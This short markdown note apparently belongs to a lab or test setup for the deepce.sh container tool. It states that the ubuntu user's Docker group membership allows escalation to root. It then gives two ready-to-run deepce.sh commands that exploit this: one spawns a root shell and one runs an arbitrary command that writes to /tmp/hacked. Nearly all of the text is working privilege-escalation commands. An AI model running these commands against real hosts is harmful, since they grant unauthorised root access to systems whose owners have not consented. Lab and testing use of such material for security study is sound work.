# Setup
The ubuntu user is in the Docker group, this can be used to escalate privileges to root.

# Exploit
You can use deepce.sh to get priv esc using one of the following commands:

- Shell
```
./deepce.sh --no-enumeration -exploit DOCKER
```
- Custom command
```
./deepce.sh --no-enumeration -exploit DOCKER --command "whoami>/tmp/hacked"
```

